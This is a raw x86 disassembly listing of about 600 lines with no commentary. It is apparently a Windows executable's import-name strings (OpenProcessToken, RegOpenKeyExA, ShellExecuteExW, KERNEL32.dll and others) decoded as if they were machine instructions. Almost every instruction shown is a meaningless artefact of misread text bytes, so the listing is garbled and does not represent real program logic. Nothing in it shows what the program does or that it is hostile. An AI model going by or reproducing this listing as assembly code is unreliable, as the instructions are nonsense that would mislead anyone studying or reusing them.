  407370:	xchg   esi,eax
  407371:	jns    0x407373
  407373:	add    BYTE PTR [edx-0x37ffff87],dh
  407379:	jns    0x40737b
  40737b:	add    dh,bl
  40737d:	jns    0x40737f
  40737f:	add    BYTE PTR [esi+0x75],ah
  407382:	add    BYTE PTR [eax],al
  407384:	cli    
  407385:	jns    0x407387
  407387:	add    BYTE PTR [eax],al
  407389:	add    BYTE PTR [eax],al
  40738b:	add    BYTE PTR [edx-0x6dffff8a],ah
  407391:	jbe    0x407393
  407393:	add    al,ch
  407395:	jns    0x407397
  407397:	add    BYTE PTR [eax],al
  407399:	add    BYTE PTR [eax],al
  40739b:	add    BYTE PTR [eax],ch
  40739d:	add    DWORD PTR [ebp+0x76],eax
  4073a0:	outs   dx,BYTE PTR gs:[esi]
  4073a2:	je     0x4073fb
  4073a4:	jb     0x40740f
  4073a6:	je     0x40740d
  4073a8:	push   esp
  4073a9:	jb     0x40740c
  4073ab:	outs   dx,BYTE PTR ds:[esi]
  4073ac:	jae    0x407414
  4073ae:	gs jb  0x4073b1
  4073b1:	add    BYTE PTR [edx],ah
  4073b3:	add    DWORD PTR [ebp+0x76],eax
  4073b6:	outs   dx,BYTE PTR gs:[esi]
  4073b8:	je     0x40740f
  4073ba:	outs   dx,BYTE PTR ds:[esi]
  4073bb:	jb     0x407422
  4073bd:	imul   esi,DWORD PTR [bp+di+0x74],0x21007265
  4073c5:	add    DWORD PTR [ebp+0x76],eax
  4073c8:	outs   dx,BYTE PTR gs:[esi]
  4073ca:	je     0x40741f
  4073cc:	gs je  0x407418
  4073cf:	outs   dx,BYTE PTR ds:[esi]
  4073d0:	outs   dx,WORD PTR ds:[esi]
  4073d2:	jb     0x407441
  4073d4:	popa   
  4073d5:	je     0x407440
  4073d7:	outs   dx,DWORD PTR ds:[esi]
  4073d8:	outs   dx,BYTE PTR ds:[esi]
  4073d9:	add    BYTE PTR [eax],ah
  4073db:	add    DWORD PTR [ebp+0x76],eax
  4073de:	outs   dx,BYTE PTR gs:[esi]
  4073e0:	je     0x407434
  4073e2:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x41007265
  4073eb:	inc    esp
  4073ec:	push   esi
  4073ed:	inc    ecx
  4073ee:	push   eax
  4073ef:	dec    ecx
  4073f0:	xor    esi,DWORD PTR [edx]
  4073f2:	cs fs ins BYTE PTR es:[edi],dx
  4073f5:	ins    BYTE PTR es:[edi],dx
  4073f6:	add    BYTE PTR [eax],al
  4073f8:	stos   DWORD PTR es:[edi],eax
  4073f9:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4073fd:	fs dec esp
  4073ff:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  407406:	js     0x40745f
  407408:	add    BYTE PTR [eax],al
  40740a:	add    al,BYTE PTR [bx+0x65]
  40740e:	je     0x40745d
  407410:	outs   dx,DWORD PTR ds:[esi]
  407411:	fs jne 0x407480
  407414:	gs dec eax
  407416:	popa   
  407417:	outs   dx,BYTE PTR ds:[esi]
  407418:	fs ins BYTE PTR es:[edi],dx
  40741a:	gs inc ebp
  40741c:	js     0x407475
  40741e:	add    BYTE PTR [eax],al
  407420:	push   0x74654702
  407425:	dec    ebp
  407426:	outs   dx,DWORD PTR ds:[esi]
  407427:	fs jne 0x407496
  40742a:	gs dec eax
  40742c:	popa   
  40742d:	outs   dx,BYTE PTR ds:[esi]
  40742e:	fs ins BYTE PTR es:[edi],dx
  407430:	gs push edi
  407432:	add    BYTE PTR [eax],al
  407434:	sahf   
  407435:	add    al,BYTE PTR [edi+0x65]
  407438:	je     0x40748a
  40743a:	jb     0x4074ab
  40743c:	arpl   WORD PTR [ecx+0x64],ax
  40743f:	fs jb  0x4074a7
  407442:	jae    0x4074b7
  407444:	add    BYTE PTR [eax],al
  407446:	arpl   WORD PTR [edx],ax
  407448:	inc    edi
  407449:	gs je  0x407499
  40744c:	outs   dx,DWORD PTR ds:[esi]
  40744d:	fs jne 0x4074bc
  407450:	gs inc esi
  407452:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  40745a:	add    BYTE PTR [eax],al
  40745c:	mov    BYTE PTR [ecx],al
  40745e:	inc    esi
  40745f:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  407466:	jne    0x4074da
  407468:	arpl   WORD PTR [ebp+0x45],sp
  40746b:	js     0x4074c4
  40746d:	add    BYTE PTR [edi+0x616f4c03],ch
  407473:	fs push edx
  407475:	gs jae 0x4074e7
  407478:	jne    0x4074ec
  40747a:	arpl   WORD PTR [ebp+0x0],sp
  40747d:	add    cl,al
  40747f:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  407483:	imul   edx,DWORD PTR [edx+0x65],0x73
  407487:	outs   dx,DWORD PTR ds:[esi]
  407488:	jne    0x4074fc
  40748a:	arpl   WORD PTR [ebp+0x0],sp
  40748d:	add    BYTE PTR [ebx+eax*1+0x64616f4c],ch
  407494:	dec    esp
  407495:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  40749c:	add    BYTE PTR [eax],al
  40749e:	retf   0x4701
  4074a1:	gs je  0x4074e7
  4074a4:	outs   dx,DWORD PTR ds:[esi]
  4074a5:	ins    DWORD PTR es:[edi],dx
  4074a6:	ins    DWORD PTR es:[edi],dx
  4074a7:	popa   
  4074a8:	outs   dx,BYTE PTR ds:[esi]
  4074a9:	fs dec esp
  4074ab:	imul   ebp,DWORD PTR [esi+0x65],0x60f0057
  4074b2:	ins    BYTE PTR es:[edi],dx
  4074b3:	jae    0x407529
  4074b5:	jb     0x40751a
  4074b7:	ins    DWORD PTR es:[edi],dx
  4074b8:	jo     0x407511
  4074ba:	add    BYTE PTR [eax],al
  4074bc:	inc    ebp
  4074bd:	add    ecx,DWORD PTR [ecx+0x6e]
  4074c0:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x65426563
  4074c8:	imul   ebp,DWORD PTR [bp+0x49],0x6974696e
  4074d0:	popa   
  4074d1:	ins    BYTE PTR es:[edi],dx
  4074d2:	imul   edi,DWORD PTR [edx+0x65],0x49034600
  4074d9:	outs   dx,BYTE PTR ds:[esi]
  4074da:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x6f436563
  4074e2:	ins    DWORD PTR es:[edi],dx
  4074e3:	jo     0x407551
  4074e5:	gs je  0x40754d
  4074e8:	add    BYTE PTR [eax],al
  4074ea:	mov    dh,0x3
  4074ec:	dec    esp
  4074ed:	outs   dx,DWORD PTR ds:[esi]
  4074ee:	arpl   WORD PTR [ecx+0x6c],sp
  4074f1:	inc    esi
  4074f2:	jb     0x407559
  4074f4:	add    BYTE PTR gs:[esi+0x65724601],bl
  4074fb:	gs dec esp
  4074fd:	imul   esp,DWORD PTR [edx+0x72],0x797261
  407504:	dec    ebx
  407505:	inc    ebp
  407506:	push   edx
  407507:	dec    esi
  407508:	inc    ebp
  407509:	dec    esp
  40750a:	xor    esi,DWORD PTR [edx]
  40750c:	cs fs ins BYTE PTR es:[edi],dx
  40750f:	ins    BYTE PTR es:[edi],dx
  407510:	add    BYTE PTR [eax],al
  407512:	lsl    edx,WORD PTR [ebx+0x65]
  407516:	je     0x407568
  407518:	jb     0x407589
  40751a:	arpl   WORD PTR [ebp+0x73],sp
  40751d:	jae    0x407563
  40751f:	push   eax
  407520:	dec    ecx
  407521:	inc    ecx
  407522:	ja     0x407585
  407524:	jb     0x40758b
  407526:	add    BYTE PTR [eax],al
  407528:	pop    esp
  407529:	add    cl,BYTE PTR [ebp+0x65]
  40752c:	jae    0x4075a1
  40752e:	popa   
  40752f:	addr16 gs inc edx
  407532:	outs   dx,DWORD PTR ds:[esi]
  407533:	js     0x40758c
  407535:	add    BYTE PTR [ebp+0x53],dl
  407538:	inc    ebp
  407539:	push   edx
  40753a:	xor    esi,DWORD PTR [edx]
  40753c:	cs fs ins BYTE PTR es:[edi],dx
  40753f:	ins    BYTE PTR es:[edi],dx
  407540:	add    BYTE PTR [eax],al
  407542:	dec    ebp
  407543:	inc    esi
  407544:	inc    ebx
  407545:	xor    al,0x32
  407547:	jne    0x407577
  407549:	fs ins BYTE PTR es:[edi],dx
  40754b:	ins    BYTE PTR es:[edi],dx
  40754c:	add    BYTE PTR [eax],al
  40754e:	or     eax,0x63775f04
  407553:	jae    0x4075be
  407555:	arpl   WORD PTR [ebp+0x70],bp
  407558:	add    BYTE PTR [eax],al
  40755a:	sbb    al,BYTE PTR [ebx]
  40755c:	pop    edi
  40755d:	jo     0x4075d4
  40755f:	jb     0x4075c6
  407561:	arpl   WORD PTR [ecx+0x6c],sp
  407564:	ins    BYTE PTR es:[edi],dx
  407565:	add    BYTE PTR [edi+0x0],ch
  407568:	pop    edi
  407569:	pop    eax
  40756a:	arpl   WORD PTR [eax+0x74],si
  40756d:	inc    esi
  40756e:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  407576:	pop    edi
  407577:	pop    edi
  407578:	jo     0x4075d9
  40757a:	pop    edi
  40757b:	arpl   WORD PTR [edi+0x6d],bp
  40757e:	ins    DWORD PTR es:[edi],dx
  40757f:	outs   dx,DWORD PTR ds:[esi]
  407580:	fs add BYTE PTR gs:[eax],al
  407584:	adc    DWORD PTR [ecx],eax
  407586:	pop    edi
  407587:	popa   
  407588:	ins    DWORD PTR es:[edi],dx
  407589:	jae    0x4075f2
  40758b:	pop    edi
  40758c:	gs js  0x4075f8
  40758f:	je     0x407591
  407591:	add    cl,dh
  407593:	add    BYTE PTR [edi+0x5f],bl
  407596:	ja     0x4075ff
  407598:	gs je  0x407608
  40759b:	popa   
  40759c:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4075a3:	add    dl,ah
  4075a5:	add    BYTE PTR [edi+0x5f],bl
  4075a8:	jae    0x40760f
  4075aa:	je     0x40760b
  4075ac:	popa   
  4075ad:	jo     0x40761f
  4075af:	pop    edi
  4075b0:	je     0x40762b
  4075b2:	jo     0x407619
  4075b4:	add    BYTE PTR [eax],al
  4075b6:	scas   al,BYTE PTR es:[edi]
  4075b7:	add    al,0x65
  4075b9:	js     0x407624
  4075bb:	je     0x4075bd
  4075bd:	add    BYTE PTR [ebx+0x1],dh
  4075c0:	pop    edi
  4075c1:	gs js  0x40762d
  4075c4:	je     0x4075c6
  4075c6:	and    al,0x1
  4075c8:	pop    edi
  4075c9:	arpl   WORD PTR [ebp+0x78],sp
  4075cc:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  4075d4:	jo     0x407635
  4075d6:	pop    edi
  4075d7:	ins    WORD PTR es:[edi],dx
  4075d9:	outs   dx,DWORD PTR ds:[esi]
  4075da:	fs add BYTE PTR gs:[eax],al
  4075de:	in     al,0x0
  4075e0:	pop    edi
  4075e1:	pop    edi
  4075e2:	jae    0x407649
  4075e4:	je     0x40765b
  4075e6:	jae    0x40764d
  4075e8:	jb     0x407657
  4075ea:	popa   
  4075eb:	je     0x407655
  4075ed:	gs jb  0x407662
  4075f0:	add    BYTE PTR [eax],al
  4075f2:	call   0x6ea9d4f8
  4075f7:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  4075ff:	add    al,0x5f
  407601:	ja     0x407666
  407603:	ins    DWORD PTR es:[edi],dx
  407604:	fs ins BYTE PTR es:[edi],dx
  407606:	outs   dx,BYTE PTR ds:[esi]
  407607:	add    BYTE PTR [ebp+0x73],ch
  40760a:	jbe    0x40766f
  40760c:	jb     0x407682
  40760e:	cs fs ins BYTE PTR es:[edi],dx
  407611:	ins    BYTE PTR es:[edi],dx
  407612:	add    BYTE PTR [eax],al
  407614:	pusha  
  407615:	add    bl,BYTE PTR [edi+0x6c]
  407618:	outs   dx,DWORD PTR ds:[esi]
  407619:	arpl   WORD PTR [ebx+0x0],bp
  40761c:	les    eax,FWORD PTR [ebx]
  40761e:	pop    edi
  40761f:	jne    0x40768f
  407621:	ins    BYTE PTR es:[edi],dx
  407622:	outs   dx,DWORD PTR ds:[esi]
  407623:	arpl   WORD PTR [ebx+0x0],bp
  407626:	popf   
  407627:	add    BYTE PTR [edi+0x5f],bl
  40762a:	fs ins BYTE PTR es:[edi],dx
  40762c:	ins    BYTE PTR es:[edi],dx
  40762d:	outs   dx,DWORD PTR ds:[esi]
  40762e:	outs   dx,BYTE PTR ds:[esi]
  40762f:	gs js  0x40769b
  407632:	je     0x407634
  407634:	or     DWORD PTR [ebx],eax
  407636:	pop    edi
  407637:	outs   dx,DWORD PTR ds:[esi]
  407638:	outs   dx,BYTE PTR ds:[esi]
  407639:	gs js  0x4076a5
  40763c:	je     0x40763e
  40763e:	adc    DWORD PTR [eax],eax
  407640:	aas    
  407641:	aas    
  407642:	xor    DWORD PTR [ecx+edi*2+0x70],esi
  407646:	gs pop edi
  407648:	imul   ebp,DWORD PTR [esi+0x66],0x5540406f
  40764f:	inc    ecx
  407650:	inc    ebp
  407651:	inc    eax
  407652:	pop    eax
  407653:	pop    edx
  407654:	add    BYTE PTR [eax],al
  407656:	xor    eax,0x65743f00
  40765b:	jb     0x4076ca
  40765d:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  407664:	pop    ecx
  407665:	inc    ecx
  407666:	pop    eax
  407667:	pop    eax
  407668:	pop    edx
  407669:	add    BYTE PTR [edi],dh
  40766b:	add    DWORD PTR [edi+0x63],ebx
  40766e:	outs   dx,DWORD PTR ds:[esi]
  40766f:	outs   dx,BYTE PTR ds:[esi]
  407670:	je     0x4076e4
  407672:	outs   dx,DWORD PTR ds:[esi]
  407673:	ins    BYTE PTR es:[edi],dx
  407674:	data16 jo 0x407677
  407677:	add    BYTE PTR [edx+0x1],ch
  40767a:	pop    edi
  40767b:	gs js  0x4076e1
  40767e:	gs jo  0x4076f5
  407681:	pop    edi
  407682:	push   0x6c646e61
  407687:	gs jb  0x4076be
  40768a:	pop    edi
  40768b:	arpl   WORD PTR [edi+0x6d],bp
  40768e:	ins    DWORD PTR es:[edi],dx
  40768f:	outs   dx,DWORD PTR ds:[esi]
  407690:	outs   dx,BYTE PTR ds:[esi]
  407691:	add    BYTE PTR [ebp+0x0],bl
  407694:	inc    ebx
  407695:	outs   dx,DWORD PTR ds:[esi]
  407696:	dec    ecx
  407697:	outs   dx,BYTE PTR ds:[esi]
  407698:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4076a0:	add    BYTE PTR [eax],al
  4076a2:	lea    eax,[eax]
  4076a4:	inc    ebx
  4076a5:	outs   dx,DWORD PTR ds:[esi]
  4076a6:	push   ebp
  4076a7:	outs   dx,BYTE PTR ds:[esi]
  4076a8:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  4076af:	imul   edi,DWORD PTR [edx+0x65],0x6c6f0000
  4076b6:	xor    esi,DWORD PTR gs:[edx]
  4076b9:	cs fs ins BYTE PTR es:[edi],dx
  4076bc:	ins    BYTE PTR es:[edi],dx
  4076bd:	add    BYTE PTR [edi],al
  4076bf:	add    BYTE PTR [ebx+0x6f],al
  4076c2:	ins    DWORD PTR es:[edi],dx
  4076c3:	ins    DWORD PTR es:[edi],dx
  4076c4:	popa   
  4076c5:	outs   dx,BYTE PTR ds:[esi]
  4076c6:	fs dec esp
  4076c8:	imul   ebp,DWORD PTR [esi+0x65],0x72416f54
  4076cf:	addr16 jbe 0x407729
  4076d2:	add    BYTE PTR [eax],al
  4076d4:	push   ebx
  4076d5:	dec    eax
  4076d6:	inc    ebp
  4076d7:	dec    esp
  4076d8:	dec    esp
  4076d9:	xor    esi,DWORD PTR [edx]
  4076db:	cs fs ins BYTE PTR es:[edi],dx
  4076de:	ins    BYTE PTR es:[edi],dx
  4076df:	add    BYTE PTR [esi+0x67655202],al
  4076e5:	dec    edi
  4076e6:	jo     0x40774d
  4076e8:	outs   dx,BYTE PTR ds:[esi]
  4076e9:	dec    ebx
  4076ea:	gs jns 0x407732
  4076ed:	js     0x407746
  4076ef:	add    BYTE PTR [ebx+0x67655202],dl
  4076f5:	push   ecx
  4076f6:	jne    0x40775d
  4076f8:	jb     0x407773
  4076fa:	push   esi
  4076fb:	popa   
  4076fc:	ins    BYTE PTR es:[edi],dx
  4076fd:	jne    0x407764
  4076ff:	inc    ebp
  407700:	js     0x407759
  407702:	add    BYTE PTR [eax],al
  407704:	push   ebp
  407705:	add    dl,BYTE PTR [edx+0x65]
  407708:	addr16 inc ebx
  40770a:	ins    BYTE PTR es:[edi],dx
  40770b:	outs   dx,DWORD PTR ds:[esi]
  40770c:	jae    0x407773
  40770e:	dec    ebx
  40770f:	gs jns 0x407712
  407712:	adc    eax,DWORD PTR [edx]
  407714:	dec    edi
  407715:	jo     0x40777c
  407717:	outs   dx,BYTE PTR ds:[esi]
  407718:	push   eax
  407719:	jb     0x40778a
  40771b:	arpl   WORD PTR [ebp+0x73],sp
  40771e:	jae    0x407774
  407720:	outs   dx,DWORD PTR ds:[esi]
  407721:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  407725:	add    BYTE PTR [ebx+0x1],ch
  407728:	inc    edi
  407729:	gs je  0x40777f
  40772c:	imul   esp,DWORD PTR [ebx+edx*2+0x75],0x74754162
  407734:	push   0x7469726f
  407739:	jns    0x40773b
  40773b:	add    BYTE PTR [ecx+eax*1+0x47],ch
  40773f:	gs je  0x407795
  407742:	imul   esp,DWORD PTR [ebx+edx*2+0x75],0x74754162
  40774a:	push   0x7469726f
  40774f:	jns    0x407794
  407751:	outs   dx,DWORD PTR ds:[esi]
  407752:	jne    0x4077c2
  407754:	je     0x407756
  407756:	outs   dx,DWORD PTR ds:[esi]
  407757:	add    DWORD PTR [edi+0x65],eax
  40775a:	je     0x4077b0
  40775c:	outs   dx,DWORD PTR ds:[esi]
  40775d:	imul   esp,DWORD PTR [ebp+0x6e],0x49
  407761:	outs   dx,BYTE PTR ds:[esi]
  407762:	outs   dx,WORD PTR ds:[esi]
  407764:	jb     0x4077d3
  407766:	popa   
  407767:	je     0x4077d2
  407769:	outs   dx,DWORD PTR ds:[esi]
  40776a:	outs   dx,BYTE PTR ds:[esi]
  40776b:	add    BYTE PTR [ecx+eax*1+0x61567349],bl
  407772:	ins    BYTE PTR es:[edi],dx
  407773:	imul   esp,DWORD PTR [ebx+edx*2+0x69],0x5f000064
  40777b:	add    eax,0x65656c53
  407780:	jo     0x407782
  407782:	rol    BYTE PTR [edx],0x47
  407785:	gs je  0x4077db
  407788:	je     0x4077eb
  40778a:	jb     0x407800
  40778c:	jne    0x4077fe
  40778e:	dec    ecx
  40778f:	outs   dx,BYTE PTR ds:[esi]
  407790:	outs   dx,WORD PTR ds:[esi]
  407792:	push   edi
  407793:	add    BYTE PTR [eax+0x5],dl
  407796:	push   ebx
  407797:	gs je  0x4077ef
  40779a:	outs   dx,BYTE PTR ds:[esi]
  40779b:	push   0x6c646e61
  4077a0:	gs fs inc ebp
  4077a3:	js     0x407808
  4077a5:	gs jo  0x40781c
  4077a8:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  4077af:	gs jb  0x4077b2
  4077b2:	add    al,BYTE PTR gs:[edi+0x65]
  4077b6:	je     0x407805
  4077b8:	outs   dx,DWORD PTR ds:[esi]
  4077b9:	fs jne 0x407828
  4077bc:	gs dec eax
  4077be:	popa   
  4077bf:	outs   dx,BYTE PTR ds:[esi]
  4077c0:	fs ins BYTE PTR es:[edi],dx
  4077c2:	gs inc ecx
  4077c4:	add    BYTE PTR [eax],al
  4077c6:	xor    eax,DWORD PTR [ecx+edx*2]
  4077c9:	jne    0x407830
  4077cb:	jb     0x407846
  4077cd:	push   eax
  4077ce:	gs jb  0x407837
  4077d1:	outs   dx,DWORD PTR ds:[esi]
  4077d2:	jb     0x407841
  4077d4:	popa   
  4077d5:	outs   dx,BYTE PTR ds:[esi]
  4077d6:	arpl   WORD PTR [ebp+0x43],sp
  4077d9:	outs   dx,DWORD PTR ds:[esi]
  4077da:	jne    0x40784a
  4077dc:	je     0x407843
  4077de:	jb     0x4077e0
  4077e0:	or     eax,DWORD PTR [edx]
  4077e2:	inc    edi
  4077e3:	gs je  0x407829
  4077e6:	jne    0x40785a
  4077e8:	jb     0x40784f
  4077ea:	outs   dx,BYTE PTR ds:[esi]
  4077eb:	je     0x40783d
  4077ed:	jb     0x40785e
  4077ef:	arpl   WORD PTR [ebp+0x73],sp
  4077f2:	jae    0x40783d
  4077f4:	add    BYTE PTR fs:[edi],cl
  4077f7:	add    al,BYTE PTR [edi+0x65]
  4077fa:	je     0x40783f
  4077fc:	jne    0x407870
  4077fe:	jb     0x407865
  407800:	outs   dx,BYTE PTR ds:[esi]
  407801:	je     0x407857
  407803:	push   0x64616572
  407808:	dec    ecx
  407809:	add    BYTE PTR fs:[eax],al
  40780c:	fld    DWORD PTR [edx]
  40780e:	inc    edi
  40780f:	gs je  0x407865
  407812:	jns    0x407887
  407814:	je     0x40787b
  407816:	ins    DWORD PTR es:[edi],dx
  407817:	push   esp
  407818:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  40781f:	ins    BYTE PTR es:[edi],dx
  407820:	gs push esp
  407822:	imul   ebp,DWORD PTR [ebp+0x65],0x4702f600
  407829:	gs je  0x407880
  40782c:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  407833:	je     0x407835
  407835:	add    BYTE PTR [edi+0x686e5505],cl
  40783b:	popa   
  40783c:	outs   dx,BYTE PTR ds:[esi]
  40783d:	fs ins BYTE PTR es:[edi],dx
  40783f:	gs fs inc ebp
  407842:	js     0x4078a7
  407844:	gs jo  0x4078bb
  407847:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40784e:	gs jb  0x407851
  407851:	add    BYTE PTR [edx],cl
  407853:	add    al,BYTE PTR [edi+0x65]
  407856:	je     0x40789b
  407858:	jne    0x4078cc
  40785a:	jb     0x4078c1
  40785c:	outs   dx,BYTE PTR ds:[esi]
  40785d:	je     0x4078af
  40785f:	jb     0x4078d0
  407861:	arpl   WORD PTR [ebp+0x73],sp
  407864:	jae    0x407866
  407866:	outs   dx,BYTE PTR ds:[esi]
  407867:	add    eax,0x6d726554
  40786c:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  407873:	outs   dx,DWORD PTR ds:[esi]
  407874:	arpl   WORD PTR [ebp+0x73],sp
  407877:	jae    0x407879
  407879:	add    BYTE PTR [ebx+0x3],cl
  40787c:	dec    ecx
  40787d:	outs   dx,BYTE PTR ds:[esi]
  40787e:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  407886:	inc    ebx
  407887:	jb     0x4078f2
  407889:	je     0x4078f4
  40788b:	arpl   WORD PTR [ecx+0x6c],sp
  40788e:	push   ebx
  40788f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407894:	outs   dx,BYTE PTR ds:[esi]
  407895:	add    BYTE PTR [ecx+eax*1],al
  407898:	inc    esp
  407899:	gs ins BYTE PTR es:[edi],dx
  40789b:	gs je  0x407903
  40789e:	inc    ebx
  40789f:	jb     0x40790a
  4078a1:	je     0x40790c
  4078a3:	arpl   WORD PTR [ecx+0x6c],sp
  4078a6:	push   ebx
  4078a7:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4078ac:	outs   dx,BYTE PTR ds:[esi]
  4078ad:	add    BYTE PTR [ecx],cl
  4078af:	add    eax,DWORD PTR [edi+0x65]
  4078b2:	je     0x40790a
  4078b4:	gs jb  0x40792a
  4078b7:	imul   ebp,DWORD PTR [edi+0x6e],0x577845
  4078be:	jge    0x4078c0
  4078c0:	inc    ebx
  4078c1:	ins    BYTE PTR es:[edi],dx
  4078c2:	outs   dx,DWORD PTR ds:[esi]
  4078c3:	jae    0x40792a
  4078c5:	dec    eax
  4078c6:	popa   
  4078c7:	outs   dx,BYTE PTR ds:[esi]
  4078c8:	fs ins BYTE PTR es:[edi],dx
  4078ca:	add    BYTE PTR gs:[ebp+0x1],dl
  4078ce:	inc    ebp
  4078cf:	js     0x407941
  4078d1:	popa   
  4078d2:	outs   dx,BYTE PTR ds:[esi]
  4078d3:	fs inc ebp
  4078d5:	outs   dx,BYTE PTR ds:[esi]
  4078d6:	jbe    0x407941
  4078d8:	jb     0x407949
  4078da:	outs   dx,BYTE PTR ds:[esi]
  4078db:	ins    DWORD PTR es:[edi],dx
  4078dc:	outs   dx,BYTE PTR gs:[esi]
  4078de:	je     0x407933
  4078e0:	je     0x407954
  4078e2:	imul   ebp,DWORD PTR [esi+0x67],0xb005773
  4078e9:	add    eax,0x6d6d656d
  4078ee:	outs   dx,DWORD PTR ds:[esi]
  4078ef:	jbe    0x407956
  4078f1:	add    dh,ch
  4078f3:	add    ebx,DWORD PTR [edi+0x76]
  4078f6:	jae    0x407966
  4078f8:	ja     0x40796a
  4078fa:	jb     0x407965
  4078fc:	outs   dx,BYTE PTR ds:[esi]
  4078fd:	je     0x407965
  4078ff:	pop    edi
  407900:	jae    0x407902
  407902:	jl     0x407909
  407904:	ja     0x407969
  407906:	jae    0x407976
  407908:	arpl   WORD PTR [eax+0x79],si
  40790b:	pop    edi
  40790c:	jae    0x40790e
  40790e:	jge    0x407915
  407910:	ja     0x407975
  407912:	jae    0x407982
  407914:	ins    BYTE PTR es:[edi],dx
  407915:	outs   dx,BYTE PTR gs:[esi]
  407917:	add    BYTE PTR [ecx],ch
  407919:	add    BYTE PTR [edi],bh
  40791b:	aas    
  40791c:	pop    edi
  40791d:	push   esi
  40791e:	inc    eax
  40791f:	pop    ecx
  407920:	inc    ecx
  407921:	pop    eax
  407922:	push   eax
  407923:	inc    ecx
  407924:	pop    eax
  407925:	inc    eax
  407926:	pop    edx
  407927:	add    BYTE PTR [ecx],cl
  407929:	add    BYTE PTR [edi],bh
  40792b:	aas    
  40792c:	xor    BYTE PTR [ebp+0x78],ah
  40792f:	arpl   WORD PTR [ebp+0x70],sp
  407932:	je     0x40799d
  407934:	outs   dx,DWORD PTR ds:[esi]
  407935:	outs   dx,BYTE PTR ds:[esi]
  407936:	inc    eax
  407937:	inc    eax
  407938:	push   ecx
  407939:	inc    ecx
  40793a:	inc    ebp
  40793b:	inc    eax
  40793c:	inc    ecx
  40793d:	inc    edx
  40793e:	push   ecx
  40793f:	inc    edx
  407940:	inc    esp
  407941:	inc    eax
  407942:	pop    edx
  407943:	add    BYTE PTR [edx],cl
  407945:	add    BYTE PTR [edi],bh
  407947:	aas    
  407948:	xor    BYTE PTR [ebp+0x78],ah
  40794b:	arpl   WORD PTR [ebp+0x70],sp
  40794e:	je     0x4079b9
  407950:	outs   dx,DWORD PTR ds:[esi]
  407951:	outs   dx,BYTE PTR ds:[esi]
  407952:	inc    eax
  407953:	inc    eax
  407954:	push   ecx
  407955:	inc    ecx
  407956:	inc    ebp
  407957:	inc    eax
  407958:	inc    ecx
  407959:	inc    edx
  40795a:	push   ecx
  40795b:	inc    edx
  40795c:	inc    esp
  40795d:	dec    eax
  40795e:	inc    eax
  40795f:	pop    edx
  407960:	add    BYTE PTR [eax],al
  407962:	or     eax,DWORD PTR [eax]
  407964:	aas    
  407965:	aas    
  407966:	xor    BYTE PTR [ebp+0x78],ah
  407969:	arpl   WORD PTR [ebp+0x70],sp
  40796c:	je     0x4079d7
  40796e:	outs   dx,DWORD PTR ds:[esi]
  40796f:	outs   dx,BYTE PTR ds:[esi]
  407970:	inc    eax
  407971:	inc    eax
  407972:	push   ecx
  407973:	inc    ecx
  407974:	inc    ebp
  407975:	inc    eax
  407976:	inc    ecx
  407977:	inc    edx
  407978:	push   esi
  407979:	xor    BYTE PTR [eax+0x40],al
  40797c:	pop    edx
  40797d:	add    BYTE PTR [eax],dl
  40797f:	add    BYTE PTR [edi],bh
  407981:	aas    
  407982:	xor    DWORD PTR [ebp+0x78],esp
  407985:	arpl   WORD PTR [ebp+0x70],sp
  407988:	je     0x4079f3
  40798a:	outs   dx,DWORD PTR ds:[esi]
  40798b:	outs   dx,BYTE PTR ds:[esi]
  40798c:	inc    eax
  40798d:	inc    eax
  40798e:	push   ebp
  40798f:	inc    ecx
  407990:	inc    ebp
  407991:	inc    eax
  407992:	pop    eax
  407993:	pop    edx
  407994:	add    BYTE PTR [eax],al
  407996:	aaa    
  407997:	add    BYTE PTR [edi],bh
  407999:	ja     0x407a03
  40799b:	popa   
  40799c:	je     0x4079de
  40799e:	gs js  0x407a04
  4079a1:	gs jo  0x407a18
  4079a4:	imul   ebp,DWORD PTR [edi+0x6e],0x42554040
  4079ab:	inc    ebp
  4079ac:	push   eax
  4079ad:	inc    edx
  4079ae:	inc    esp
  4079af:	pop    eax
  4079b0:	pop    edx
  4079b1:	add    BYTE PTR [eax+eax*1+0x5f],ah
  4079b5:	inc    ebx
  4079b6:	js     0x407a30
  4079b8:	push   esp
  4079b9:	push   0x45776f72
  4079be:	js     0x407a23
  4079c0:	gs jo  0x407a37
  4079c3:	imul   ebp,DWORD PTR [edi+0x6e],0x790000
  4079ca:	pop    edi
  4079cb:	pop    edi
  4079cc:	inc    ebx
  4079cd:	js     0x407a47
  4079cf:	inc    esi
  4079d0:	jb     0x407a33
  4079d2:	ins    DWORD PTR es:[edi],dx
  4079d3:	gs dec eax
  4079d5:	popa   
  4079d6:	outs   dx,BYTE PTR ds:[esi]
  4079d7:	fs ins BYTE PTR es:[edi],dx
  4079d9:	gs jb  0x407a0f
  4079dc:	add    BYTE PTR [eax],al
  4079de:	or     DWORD PTR ds:0x636d656d,eax
  4079e4:	jo     0x407a5f
  4079e6:	add    BYTE PTR [eax],al
  4079e8:	leave  
  4079e9:	add    DWORD PTR [ebx+0x74],edx
  4079ec:	jb     0x407a57
  4079ee:	outs   dx,BYTE PTR ds:[esi]
  4079ef:	addr16 inc esi
  4079f1:	jb     0x407a62
  4079f3:	ins    DWORD PTR es:[edi],dx
  4079f4:	inc    edi
  4079f5:	push   ebp
